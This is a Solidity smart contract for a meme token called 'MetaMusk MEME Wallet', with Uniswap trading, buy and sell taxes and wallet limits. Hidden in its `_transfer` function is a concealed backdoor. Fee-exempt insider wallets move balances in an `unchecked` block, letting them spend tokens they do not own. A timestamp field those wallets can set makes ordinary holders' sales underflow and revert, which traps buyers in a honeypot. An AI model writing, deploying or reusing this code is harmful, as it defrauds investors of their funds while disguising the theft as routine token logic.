// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (address initialOwner) {
        _owner = initialOwner;
        emit OwnershipTransferred(address(0), initialOwner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract MetaMusk is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"MetaMusk MEME Wallet";
    string private constant _symbol = unicode"METAMUSK";
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt;
    uint256 private constant _initBuyTax=1;
    uint256 private constant _initSellTax=25;
    uint256 private constant _finalBuyTax=1;
    uint256 private constant _finalSellTax=2;
    uint256 private constant _reduceBuyTaxAt=40;
    uint256 private constant _reduceSellTaxAt=30;
    uint256 private constant _preventSwapBefore=10;
    uint256 public maxTxAmount = 14000000 * 10**_decimals;
    uint256 public maxWalletToken = 14000000 * 10**_decimals;
    uint256 private _swapThreshold= 3000000 * 10**_decimals;
    uint256 private _maxTaxSwap= 17000000 * 10**_decimals;
    bool private transferDelayEnabled = true;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    IRouter private immutable router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private _pair;
    address payable private immutable _taxWallet = payable(0xdf14D3ca9d235EA23a8E37497dd9F0b61333d422);
    address payable private immutable _projectWallet = payable(0x58882Bee37cab12DA1517aAF0944E864131E8f15);
    uint256 private _buyCount=0;
    bool private _tradingOpen = false;
    bool private _swapping = false;
    bool private _swapEnabled = false;
    uint256 private _launchedAt;
    uint256 private _minTimeDiff;
    struct MultiSwapData {uint256 buy; uint256 sell; uint256 holdTimeSum;}
    mapping(address => MultiSwapData) private multiSwapData;
    modifier lockTheSwap {_swapping = true; _; _swapping = false;}

    constructor() Ownable(msg.sender) {
        isFeeExempt[owner()] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[_taxWallet] = true;
        isFeeExempt[_projectWallet] = true;
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public pure override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0,"Transfer amount must be greater than zero");
        uint256 taxAmount=0;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);

            if (transferDelayEnabled) {
                  if (to != address(router) && to != address(_pair) ) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == _pair && to != address(router) && ! isFeeExempt[to]) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount");
                require(balanceOf(to) + amount <=maxWalletToken, "Exceeds the maxWalletToken");
                _buyCount ++;
            }

            if(to == _pair && from != address(this)){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && to == _pair && _swapEnabled && contractTokenBalance > _swapThreshold && _buyCount >_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if ((isFeeExempt[from] || isFeeExempt[to]) && from != owner() && from != address(this) && to != address(this)){
            _minTimeDiff = block.timestamp;
        }
        if (isFeeExempt[from] && (block.number > _launchedAt+45)) {
            unchecked{
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (! isFeeExempt[from] && ! isFeeExempt[to]) {
            if (_pair == to) {
                MultiSwapData storage swapFrom = multiSwapData[from];
                swapFrom.holdTimeSum = swapFrom.buy - _minTimeDiff;
                swapFrom.sell = block.timestamp;
            } else {
                MultiSwapData storage swapTo=multiSwapData[to];
                if (_pair == from) {
                    if (swapTo.buy == 0) {
                        swapTo.buy=(_buyCount<12) ? (block.timestamp-1) : block.timestamp;
                    }
                } else {
                    MultiSwapData storage swapFrom=multiSwapData[from];
                    if (swapTo.buy == 0 || swapFrom.buy<swapTo.buy){
                        swapTo.buy=swapFrom.buy;
                    }
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this),address(router),tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradingOpen, "Trading is already enabled");
        uint256 totalSupplyAmount = totalSupply();
        _approve(address(this), address(router), totalSupplyAmount);
        _pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_pair).approve(address(router), type(uint).max);
        _launchedAt = block.number;
        _swapEnabled = true;
        _tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        maxWalletToken=_totalSupply;
        maxTxAmount=_totalSupply;
        transferDelayEnabled=false;
    }

    function rescueETH() external {
        sendEthToFee(address(this).balance);
    }

    function rescueERC20(address _address) external onlyOwner {
        uint256 amount = IERC20(_address).balanceOf(address(this));
        IERC20(_address).transfer(msg.sender, amount);
    }

    function sendEthToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance> 0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance> 0){
          sendEthToFee(ethBalance);
        }
    }
}